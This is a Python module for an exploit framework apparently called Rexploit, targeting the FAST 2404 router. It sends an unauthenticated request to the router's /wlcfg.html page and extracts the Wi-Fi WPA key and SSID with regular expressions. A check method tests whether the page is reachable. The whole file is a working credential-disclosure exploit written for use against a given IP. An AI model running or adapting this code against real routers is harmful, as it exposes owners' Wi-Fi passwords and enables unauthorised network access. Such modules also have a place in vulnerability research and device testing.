import requests
import re

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="FAST 2404 Wifi key and SSID disclosure",
            category="disclosure",
            authors={
                "Vulnerability discovery": "Daniel Diez",
                "Rexploit module": "Daniel Diez"
            },
            targets=[
                "FAST 2404"
            ],
            date="08/06/2015",
            cwe="28",
            description="This router is vulnerable to information disclosure. The vulnerability exist in the web interface, which is  accessible without authentication. "
        )

    def default(self):
        data = {"url": "/wlcfg.html"}

        return data

    def run(self, data):
        url = data["url"]
        url = "http://{0}{1}".format(self.ip, url)

        try:
            response = requests.get(url)

            if response.content:
                # var ssid = 'Orange-XFXX';
                # var wpaPskKey = '123456';
                key = re.search(r'(.*) wpaPskKey (.*?);', response.content, re.M | re.I)
                ssid = re.search(r'(.*) ssid (.*?);', response.content, re.M | re.I)
                message = "{} {}".format(key.group(), ssid.group())
            else:
                message = "Error"

            return message

        except requests.ConnectionError:
            return None

    def check(self):
        data = self.default()
        url = data["url"]

        url = "http://{0}{1}".format(self.ip, url)

        try:
            r = requests.get(url)

            if r.status_code == 200:
                return True
            else:
                return False
        except requests.ConnectionError:
            return None
